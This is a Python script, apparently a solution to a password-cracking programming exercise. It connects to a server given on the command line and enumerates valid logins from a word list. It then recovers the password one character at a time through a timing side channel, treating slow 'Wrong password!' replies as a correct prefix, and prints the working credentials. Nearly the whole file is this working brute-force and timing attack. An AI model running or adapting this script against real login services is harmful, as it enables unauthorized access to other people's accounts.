# Challenging

import json
import time
import socket
import string
import itertools

from argparse import ArgumentParser


class Hacker:
    def __init__(self, host, port):
        self.my_socket = socket.socket()
        self.host = host
        self.port = port

    def main(self):
        self.my_socket.connect((self.host, self.port))
        account = self.get_account()
        passwords = self.passwords()
        pwd = None
        while True:
            password = next(passwords)
            if pwd:
                password = pwd + password
            data: str = json.dumps({"login": account, "password": password}, indent=4)
            self.my_socket.send(data.encode("utf8"))
            start = time.perf_counter()
            rep = self.my_socket.recv(10240)
            end = time.perf_counter()
            total = end - start
            res = json.loads(rep.decode("utf8"))
            result = res.get("result")
            if result == "Wrong password!":
                if total >= 0.1:
                    pwd = password
                    passwords.send("restart")
                else:
                    continue
            elif result == "Connection success!":
                print(data)
                self.my_socket.close()
                break

    def get_account(self):
        f = open("logins.txt", "r")
        accounts = self.accounts_dictionary(f)
        for account in accounts:
            account = account.strip("\n")
            data = json.dumps({"login": account, "password": " "}, indent=4)
            self.my_socket.send(data.encode('utf8'))
            rep = self.my_socket.recv(1024)
            res: dict = json.loads(rep.decode("utf8"))
            if res.get("result") == "Wrong password!":
                return account

    @staticmethod
    def passwords():
        x = 0
        words = string.digits + string.ascii_letters
        while x < len(words):
            y = yield words[x]
            if y == "restart":
                x = 0
                continue
            x += 1

    @staticmethod
    def password_generator() -> str:
        words = string.digits + string.ascii_letters
        for i in range(1, 99):
            for j in itertools.product(words, repeat=i):
                yield j

    @staticmethod
    def password_dictionary(f) -> list:
        for _ in range(1000):
            data = f.readline()
            yield data

    @staticmethod
    def accounts_dictionary(f):
        for _ in range(25):
            data = f.readline()
            yield data


def main():
    parser = ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port")
    args = parser.parse_args()
    host: str = args.host
    port: int = int(args.port)
    hacker = Hacker(host, port)
    hacker.main()


if __name__ == "__main__":
    main()
